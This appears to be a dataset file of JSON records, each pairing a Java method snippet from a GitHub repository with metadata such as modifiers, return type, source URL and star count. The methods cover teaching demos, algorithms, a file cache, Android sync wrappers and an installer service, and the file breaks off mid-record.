{"method_name": "getContentMd", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContentMd() {        return contentMd;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setContentMd", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContentMd(String contentMd) {        this.contentMd = contentMd;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        System.out.println(\"\u61d2\u6c49\u5f0f2\uff0c\u7ebf\u7a0b\u5b89\u5168\uff0c\u540c\u6b65\u65b9\u6cd5\");        Singleton instance1 = Singleton.getInstance();        Singleton instance2 = Singleton.getInstance();        System.out.println(instance1 == instance2);        System.out.println(\"instance1 \u7684 hashCode \u503c\u4e3a\uff1a\" + instance1.hashCode());        System.out.println(\"instance2 \u7684 hashCode \u503c\u4e3a\uff1a\" + instance2.hashCode());    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/singleton/type4/SingletonTest04.java", "stars": "2", "class": {"name": "SingletonTest04", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getInstance", "params": [], "throws": null, "modifiers": ["synchronized", "public", "static"], "return_type": "Singleton", "snippet": "    public static synchronized Singleton getInstance(){        if(instance == null){            instance = new Singleton();        }        return instance;    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/singleton/type4/SingletonTest04.java", "stars": "2", "class": {"name": "Singleton", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        /*            static String pathSeparator \u4e0e\u7cfb\u7edf\u6709\u5173\u7684\u8def\u5f84\u5206\u9694\u7b26\uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u5b83\u88ab\u8868\u793a\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002            static char pathSeparatorChar \u4e0e\u7cfb\u7edf\u6709\u5173\u7684\u8def\u5f84\u5206\u9694\u7b26\u3002            static String separator \u4e0e\u7cfb\u7edf\u6709\u5173\u7684\u9ed8\u8ba4\u540d\u79f0\u5206\u9694\u7b26\uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u5b83\u88ab\u8868\u793a\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002            static char separatorChar \u4e0e\u7cfb\u7edf\u6709\u5173\u7684\u9ed8\u8ba4\u540d\u79f0\u5206\u9694\u7b26\u3002            \u64cd\u4f5c\u8def\u5f84:\u8def\u5f84\u4e0d\u80fd\u5199\u6b7b\u4e86            C:\\develop\\a\\a.txt  windows            C:/develop/a/a.txt  linux            \"C:\"+File.separator+\"develop\"+File.separator+\"a\"+File.separator+\"a.txt\"         */        String pathSeparator = File.pathSeparator;        System.out.println(pathSeparator);//\u8def\u5f84\u5206\u9694\u7b26 windows:\u5206\u53f7;  linux:\u5192\u53f7:        String separator = File.separator;        System.out.println(separator);// \u6587\u4ef6\u540d\u79f0\u5206\u9694\u7b26 windows:\u53cd\u659c\u6760\\  linux:\u6b63\u659c\u6760/    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/19.%E3%80%90File%E7%B1%BB%E3%80%81%E9%80%92%E5%BD%92%E3%80%91-%E7%AC%94%E8%AE%B0/code/08_FileAndRecursion/src/com/itheima/demo01/File/Demo01File.java", "stars": "2", "class": {"name": "Demo01File", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onReceive", "params": ["Context", "Intent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onReceive(Context context, Intent intent) {        if(intent.getAction().equals(STOP)) {            TorrentService.stop();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/torrent/TorrentBroadcastReceiver.java", "stars": "4", "class": {"name": "TorrentBroadcastReceiver", "extends": "BroadcastReceiver", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\t// TODO Auto-generated method stub\t\t//\t\tint arr[] = {1,7,-13,2};\t\t//\t\tint ans = Best(arr);\t\t//\t\tSystem.out.println(ans);//\t\tint Best= Best(arr2);//\t\tint BestRound = Best_Round(arr2);//\t\tBestOrBestRound(Best, BestRound);\t\t\t\t\tint gas_stations[] = {3,6,2,8};\t\tint consume[] = {5,4,3,4};\t\tint result = Best_Round(GasStations(gas_stations, consume));\t\tSystem.out.println(result);\t}", "url": "https://raw.githubusercontent.com/jordantangy/Algorithm-Best/master/Algorithm-Best.java", "stars": "2", "class": {"name": "Best", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "Best", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int Best(int arr[]) {\t\tint max = 0;\t\tint h[] = new int[arr.length];\t\th[0] = arr[0];\t\tif(h[0]<0) {\t\t\th[0] = 0;\t\t}\t\tfor (int i = 1; i < h.length; i++) {\t\t\tif(h[i-1] + arr[i] < 0 ) {\t\t\t\tcontinue;\t\t\t}\t\t\telse {\t\t\t\th[i] = h[i-1] + arr[i];\t\t\t}\t\t}\t\tint max_index=0;\t\tint temp = 0;\t\tfor (int i = 0; i < h.length-1; i = i+2) {\t\t\ttemp = Math.max(h[i], h[i+1]);\t\t\tif(temp == h[i] && temp>max) {\t\t\t\tmax_index = i;\t\t\t\tmax = temp;\t\t\t}\t\t\telse if(temp == h[i+1] && temp>max) {\t\t\t\tmax_index = i+1;\t\t\t\tmax = temp;\t\t\t}\t\t}\t\tif(h.length%2 != 0) {\t\t\ttemp = h[h.length-1];\t\t\tif(temp>max) {\t\t\t\tmax = temp;\t\t\t\tmax_index = h.length-1;\t\t\t}\t\t}\t\tfind_Index_Best(arr, max_index, max);\t\tSystem.out.println(Arrays.toString(h));\t\treturn max;\t}", "url": "https://raw.githubusercontent.com/jordantangy/Algorithm-Best/master/Algorithm-Best.java", "stars": "2", "class": {"name": "Best", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "find_Index_Best", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int[] find_Index_Best(int[] arr,int index,int max) {\t\tint ans[] = new int[2];\t\tint max_sum = 0;\t\tint start_index = 0;\t\tfor (int i = index; i > 0; i--) {\t\t\tmax_sum += arr[i];\t\t\tif(max_sum == max) {\t\t\t\tstart_index = i;\t\t\t\tbreak;\t\t\t}\t\t}\t\tans[0] = start_index;\t\tans[1]=index;\t\tSystem.out.println(\"For 'Best Algo':starting index:\"+ans[0]+\" and the end index is:\"+ans[1]);\t\treturn ans;\t}", "url": "https://raw.githubusercontent.com/jordantangy/Algorithm-Best/master/Algorithm-Best.java", "stars": "2", "class": {"name": "Best", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "Best_Round", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int Best_Round(int arr[]) {\t\t\t\tint sum_arr = 0;\t\tfor (int i = 0; i < arr.length; i++) {\t\t\tsum_arr += arr[i];\t\t}\t\t\t\tfor (int i = 0; i < arr.length; i++) {\t\t\tarr[i] *= -1;\t\t}\t\tSystem.out.println(Arrays.toString(arr));\t\tint max = 0;\t\tint h[] = new int[arr.length];\t\th[0] = arr[0];\t\tif(h[0]<0) {\t\t\th[0] = 0;\t\t}\t\tfor (int i = 1; i < h.length; i++) {\t\t\tif(h[i-1] + arr[i] < 0 ) {\t\t\t\tcontinue;\t\t\t}\t\t\telse {\t\t\t\th[i] = h[i-1] + arr[i];\t\t\t}\t\t}\t\tint max_index=0;\t\t\t\tint temp = 0;\t\tfor (int i = 0; i < h.length-1; i = i+2) {\t\t\ttemp = Math.max(h[i], h[i+1]);\t\t\tif(temp == h[i] && temp>max) {\t\t\t\tmax_index = i;\t\t\t\tmax = temp;\t\t\t}\t\t\telse if(temp == h[i+1] && temp>max) {\t\t\t\tmax_index = i+1;\t\t\t\tmax = temp;\t\t\t}\t\t}\t\tif(h.length%2 != 0) {\t\t\ttemp = h[h.length-1];\t\t\tif(temp>max) {\t\t\t\tmax = temp;\t\t\t\tmax_index = h.length-1;\t\t\t}\t\t}\t\tfind_index_Round(arr,max,max_index);\t\tint potential1 = sum_arr-(-max);\t\tmax = potential1;\t\treturn max;\t}", "url": "https://raw.githubusercontent.com/jordantangy/Algorithm-Best/master/Algorithm-Best.java", "stars": "2", "class": {"name": "Best", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "find_index_Round", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void find_index_Round(int arr[],int max,int index) {\t\t\t\tint sum = 0;\t\tint start_index = 0;\t\tint end_index = 0;\t\tfor (int i = index; i>=0 ; i--) {\t\t\tsum += arr[i];\t\t\tif(sum == max) {\t\t\t\t\t\t\t\tif(i == 0) {\t\t\t\t\tend_index = arr.length-1;\t\t\t\t}\t\t\t\telse {\t\t\t\t\tend_index = i - 1 ;\t\t\t\t}\t\t\t\tif(start_index == arr.length-1) {\t\t\t\t\tstart_index = 0;\t\t\t\t}\t\t\t\telse {\t\t\t\t\tstart_index = index+1;\t\t\t\t}\t\t\t}\t\t}\t\tSystem.out.println(\"For Best-round Algorithm, the start index is: \" +start_index+ \"and the end index is\"+end_index);\t\t\t}", "url": "https://raw.githubusercontent.com/jordantangy/Algorithm-Best/master/Algorithm-Best.java", "stars": "2", "class": {"name": "Best", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "BestOrBestRound", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void BestOrBestRound(int Best,int BestRound) {\t\tint ans = Math.max(Best, BestRound);\t\tif (ans == Best) {\t\t\tSystem.out.println(\"Best Algorithm gives a better result than BestRound,\");\t\t\tSystem.out.println(\"The result for Best is\"+Best+\"The result for BestRound is\"+BestRound);\t\t}\t\telse if(ans == BestRound) {\t\t\tSystem.out.println(\"'BestRound Algorithm' gives a better result than 'Best',\");\t\t\tSystem.out.println(\"The result for 'BestRound' is \"+ BestRound +\",the result for 'Best' is \"+ Best);\t\t}\t\telse {\t\t\tSystem.out.println(\"Both Algorithms give the same result\");\t\t\tSystem.out.println(\"The result for both of them is:\"+BestRound);\t\t}\t}", "url": "https://raw.githubusercontent.com/jordantangy/Algorithm-Best/master/Algorithm-Best.java", "stars": "2", "class": {"name": "Best", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "GasStations", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "\tpublic static int[] GasStations(int a[],int b[]) {\t\t\t\tint sum_a = 0;\t\tint sum_b = 0;\t\tint Nosolution[] = {-1};\t\tfor (int i = 0; i < b.length; i++) {\t\t\tsum_a += a[i];\t\t\tsum_b += b[i];\t\t}\t\t\t\tif(sum_a < sum_b) {\t\t\tSystem.out.println(\"impossible to solve the problem\");\t\t\treturn Nosolution;\t\t}\t\tint h[] = new int[a.length];\t\tfor (int i = 0; i < h.length; i++) {\t\t\th[i] = a[i]-b[i];\t\t}\t\t\t\t\t\treturn h;\t\t\t}", "url": "https://raw.githubusercontent.com/jordantangy/Algorithm-Best/master/Algorithm-Best.java", "stars": "2", "class": {"name": "Best", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLeft", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Expr", "snippet": "\tpublic Expr getLeft() {\t\treturn left;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprBinary.java", "stars": "3", "class": {"name": "ExprBinary", "extends": "Expr", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getRight", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Expr", "snippet": "\tpublic Expr getRight() {\t\treturn right;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprBinary.java", "stars": "3", "class": {"name": "ExprBinary", "extends": "Expr", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getMax", "params": ["Supplier<Integer>"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "   public static int getMax(Supplier<Integer> sup){       return sup.get();   }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo04/Supplier/Demo02Test(1).java", "stars": "2", "class": {"name": "Demo02Test", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        //\u5b9a\u4e49\u4e00\u4e2aint\u7c7b\u578b\u7684\u6570\u7ec4,\u5e76\u8d4b\u503c        int[] arr = {100,0,-50,880,99,33,-30};        //\u8c03\u7528getMax\u65b9\u6cd5,\u65b9\u6cd5\u7684\u53c2\u6570Supplier\u662f\u4e00\u4e2a\u51fd\u6570\u5f0f\u63a5\u53e3,\u6240\u4ee5\u53ef\u4ee5\u4f20\u9012Lambda\u8868\u8fbe\u5f0f        int maxValue = getMax(()->{            //\u83b7\u53d6\u6570\u7ec4\u7684\u6700\u5927\u503c,\u5e76\u8fd4\u56de            //\u5b9a\u4e49\u4e00\u4e2a\u53d8\u91cf,\u628a\u6570\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u8d4b\u503c\u7ed9\u8be5\u53d8\u91cf,\u8bb0\u5f55\u6570\u7ec4\u4e2d\u5143\u7d20\u7684\u6700\u5927\u503c            int max = arr[0];            //\u904d\u5386\u6570\u7ec4,\u83b7\u53d6\u6570\u7ec4\u4e2d\u7684\u5176\u4ed6\u5143\u7d20            for (int i : arr) {                //\u4f7f\u7528\u5176\u4ed6\u7684\u5143\u7d20\u548c\u6700\u5927\u503c\u6bd4\u8f83                if(i>max){                    //\u5982\u679ci\u5927\u4e8emax,\u5219\u66ff\u6362max\u4f5c\u4e3a\u6700\u5927\u503c                    max = i;                }            }            //\u8fd4\u56de\u6700\u5927\u503c            return max;        });        System.out.println(\"\u6570\u7ec4\u4e2d\u5143\u7d20\u7684\u6700\u5927\u503c\u662f:\"+maxValue);    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo04/Supplier/Demo02Test(1).java", "stars": "2", "class": {"name": "Demo02Test", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "invokeStatic", "params": ["MethodInsnNode", "List<AbstractValue>"], "throws": null, "modifiers": ["public"], "return_type": "AbstractValue", "snippet": "\tpublic AbstractValue invokeStatic(MethodInsnNode insn, List<? extends AbstractValue> arguments) {\t\treturn null;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/StaticInvokeFactory.java", "stars": "12", "class": {"name": "StaticInvokeFactory", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "available", "params": [], "throws": ["ProxyCacheException"], "modifiers": ["synchronized", "public"], "return_type": "long", "snippet": "    public synchronized long available() throws ProxyCacheException {        try {            return (int) dataFile.length();        } catch (IOException e) {            throw new ProxyCacheException(\"Error reading length of file \" + file, e);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/FileCache.java", "stars": "2", "class": {"name": "FileCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "read", "params": ["byte", "long", "int"], "throws": ["ProxyCacheException"], "modifiers": ["synchronized", "public"], "return_type": "int", "snippet": "    public synchronized int read(byte[] buffer, long offset, int length) throws ProxyCacheException {        try {            dataFile.seek(offset);            return dataFile.read(buffer, 0, length);        } catch (IOException e) {            String format = \"Error reading %d bytes with offset %d from file[%d bytes] to buffer[%d bytes]\";            throw new ProxyCacheException(String.format(format, length, offset, available(), buffer.length), e);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/FileCache.java", "stars": "2", "class": {"name": "FileCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "append", "params": ["byte", "int"], "throws": ["ProxyCacheException"], "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void append(byte[] data, int length) throws ProxyCacheException {        try {            if (isCompleted()) {                throw new ProxyCacheException(\"Error append cache: cache file \" + file + \" is completed!\");            }            dataFile.seek(available());            dataFile.write(data, 0, length);        } catch (IOException e) {            String format = \"Error writing %d bytes to %s from buffer with size %d\";            throw new ProxyCacheException(String.format(format, length, dataFile, data.length), e);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/FileCache.java", "stars": "2", "class": {"name": "FileCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "close", "params": [], "throws": ["ProxyCacheException"], "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void close() throws ProxyCacheException {        try {            dataFile.close();            diskUsage.touch(file);        } catch (IOException e) {            throw new ProxyCacheException(\"Error closing file \" + file, e);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/FileCache.java", "stars": "2", "class": {"name": "FileCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "complete", "params": [], "throws": ["ProxyCacheException"], "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void complete() throws ProxyCacheException {        if (isCompleted()) {            return;        }        close();        String fileName = file.getName().substring(0, file.getName().length() - TEMP_POSTFIX.length());        File completedFile = new File(file.getParentFile(), fileName);        boolean renamed = file.renameTo(completedFile);        if (!renamed) {            throw new ProxyCacheException(\"Error renaming file \" + file + \" to \" + completedFile + \" for completion!\");        }        file = completedFile;        try {            dataFile = new RandomAccessFile(file, \"r\");            diskUsage.touch(file);        } catch (IOException e) {            throw new ProxyCacheException(\"Error opening \" + file + \" as disc cache\", e);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/FileCache.java", "stars": "2", "class": {"name": "FileCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "isCompleted", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "boolean", "snippet": "    public synchronized boolean isCompleted() {        return !isTempFile(file);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/FileCache.java", "stars": "2", "class": {"name": "FileCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "getFile", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "    public File getFile() {        return file;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/FileCache.java", "stars": "2", "class": {"name": "FileCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "isTempFile", "params": ["File"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isTempFile(File file) {        return file.getName().endsWith(TEMP_POSTFIX);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/FileCache.java", "stars": "2", "class": {"name": "FileCache", "extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"method_name": "convertAccount", "params": ["Account"], "throws": null, "modifiers": ["static", "protected"], "return_type": "android", "snippet": "    protected static android.accounts.Account convertAccount(Account account) {        return new android.accounts.Account(account.name, account.type);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/EclairContentSyncer.java", "stars": "74", "class": {"name": "EclairContentSyncer", "extends": "CupcakeContentSyncer", "implements": null, "modifiers": []}}, {"method_name": "convertAccount", "params": ["android"], "throws": null, "modifiers": ["static", "protected"], "return_type": "Account", "snippet": "    protected static Account convertAccount(android.accounts.Account account) {        return new Account(account.name, account.type);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/EclairContentSyncer.java", "stars": "74", "class": {"name": "EclairContentSyncer", "extends": "CupcakeContentSyncer", "implements": null, "modifiers": []}}, {"method_name": "setIsSyncable", "params": ["Account", "String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIsSyncable(Account account, String authority, int syncable) {        ContentResolver.setIsSyncable(convertAccount(account), authority, syncable);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/EclairContentSyncer.java", "stars": "74", "class": {"name": "EclairContentSyncer", "extends": "CupcakeContentSyncer", "implements": null, "modifiers": []}}, {"method_name": "setSyncAutomatically", "params": ["Account", "String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSyncAutomatically(Account account, String authority, boolean sync) {        ContentResolver.setSyncAutomatically(convertAccount(account), authority, sync);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/EclairContentSyncer.java", "stars": "74", "class": {"name": "EclairContentSyncer", "extends": "CupcakeContentSyncer", "implements": null, "modifiers": []}}, {"method_name": "getIsSyncable", "params": ["Account", "String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getIsSyncable(Account account, String authority) {        return ContentResolver.getIsSyncable(convertAccount(account), authority);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/EclairContentSyncer.java", "stars": "74", "class": {"name": "EclairContentSyncer", "extends": "CupcakeContentSyncer", "implements": null, "modifiers": []}}, {"method_name": "getSyncAutomatically", "params": ["Account", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean getSyncAutomatically(Account account, String authority) {        return ContentResolver.getSyncAutomatically(convertAccount(account), authority);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/EclairContentSyncer.java", "stars": "74", "class": {"name": "EclairContentSyncer", "extends": "CupcakeContentSyncer", "implements": null, "modifiers": []}}, {"method_name": "requestSync", "params": ["Account", "String", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void requestSync(Account account, String authority, Bundle extras) {        ContentResolver.requestSync(convertAccount(account), authority, extras);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/EclairContentSyncer.java", "stars": "74", "class": {"name": "EclairContentSyncer", "extends": "CupcakeContentSyncer", "implements": null, "modifiers": []}}, {"method_name": "showDisableStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showDisableStatus() {        setEnabled(false);        setBackgroundResource(R.drawable.shape_button_background_disable);        setTextColor(ContextCompat.getColor(getContext(), R.color.text_color_disable));    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/ui/MyTextView.java", "stars": "2", "class": {"name": "MyTextView", "extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"method_name": "showCloseStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showCloseStatus() {        setEnabled(true);        setBackgroundResource(R.drawable.shape_button_background_disable);        setTextColor(ContextCompat.getColor(getContext(), R.color.button_background));    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/ui/MyTextView.java", "stars": "2", "class": {"name": "MyTextView", "extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"method_name": "showOpenStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showOpenStatus() {        setEnabled(true);        setBackgroundResource(R.drawable.shape_button_background_enable);        setTextColor(Color.WHITE);    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/ui/MyTextView.java", "stars": "2", "class": {"name": "MyTextView", "extends": "AppCompatTextView", "implements": null, "modifiers": ["public"]}}, {"method_name": "createFailedHttpResponse", "params": [], "throws": null, "modifiers": ["public"], "return_type": "HttpInstallResponse", "snippet": "    public HttpInstallResponse createFailedHttpResponse() {        HttpInstallResponse response = new HttpInstallResponse();        response.setCode(ResponseCode.Fail.getCode());        return response;    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/ModeService.java", "stars": "7", "class": {"name": "ModeService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkBackendInitFinished", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean checkBackendInitFinished(String host, String shPath) {        String logFilePath = this.getInstallPath() + \"bcp-app-mgr-\" + host + File.separator + \"log.out\";        try {            ProcessUtil.Result result = ProcessUtil.execCmd(\"sh ./fetchBackendInit.sh \" + logFilePath, null, shPath);            // log.info(StringUtils.isEmpty(result.getData()) ? \"\u540e\u53f0\u521d\u59cb\u5316\u4e2d\uff0c\u8bf7\u8010\u5fc3\u7b49\u5f85............\" : \"\u540e\u53f0\u521d\u59cb\u5316\u6210\u529f\");            log.info(StringUtils.isEmpty(result.getData()) ? \"Please wait patiently during background initialization............\" : \"Background initialization successful\");            return !StringUtils.isEmpty(result.getData());        } catch (Exception e) {            // log.error(\"\u67e5\u8be2\u7ba1\u7406\u540e\u53f0\u65e5\u5fd7\u5f02\u5e38\", e);            log.error(\"An exception occurred while querying the management background log\", e);            e.printStackTrace();        }        return false;    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/ModeService.java", "stars": "7", "class": {"name": "ModeService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "updateInstallResult", "params": ["String", "InstallResult", "InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateInstallResult(String remoteAddress, InstallResult result, InitConfigEntity configEntity) {        if (configEntity == null) {            File configFile = new File(this.initConfigFile);            Yaml yaml = new Yaml();            try {                configEntity = yaml.loadAs(new FileInputStream(configFile), InitConfigEntity.class);            } catch (Exception e) {                e.printStackTrace();                return;            }        }        if (result.isSuccess()) {            // log.info(String.format(\"\u8282\u70b9 %s \u5df2\u5b8c\u6210 %s \u89d2\u8272\u7684\u5b89\u88c5\", remoteAddress, result.getRole().name()));            log.info(String.format(\"Node %s has installde complete role %s\", remoteAddress, result.getRole().name()));            // \u52a0\u5165\u6570\u636e\u5e93            switch (result.getRole()) {                case ORDER:                    checkAndInsertDb(configEntity.getOrdererHostConfig(), remoteAddress, RoleEnum.ORDER, configEntity.getOrgMSPID());                    break;                case PEER:                    checkAndInsertDb(configEntity.getPeerHostConfig(), remoteAddress, RoleEnum.PEER, configEntity.getOrgMSPID());                    break;            }        }        this.rolesBiz.updateInstallResult(remoteAddress, result);    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/ModeService.java", "stars": "7", "class": {"name": "ModeService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkAndInsertDb", "params": ["Map<String,String>", "String", "RoleEnum", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void checkAndInsertDb(Map<String, String> hostConfig, String ip, RoleEnum role, String orgMspId) {        for (String host : hostConfig.keySet()) {            String hIp = hostConfig.get(host);            int index = hIp.lastIndexOf(\":\");            String port = hIp.substring(index + 1);            hIp = hIp.substring(0, index);            if (hIp.equalsIgnoreCase(ip)) {                NodeDO nodeDO = new NodeDO();                nodeDO.setOrgMspId(orgMspId);                nodeDO.setRole(role);                nodeDO.setHostName(host);                nodeDO.setIp(ip);                nodeDO.setPort(Integer.parseInt(port));                nodeDO.setStatus(InstallStatusEnum.SUCCESS);                try {                    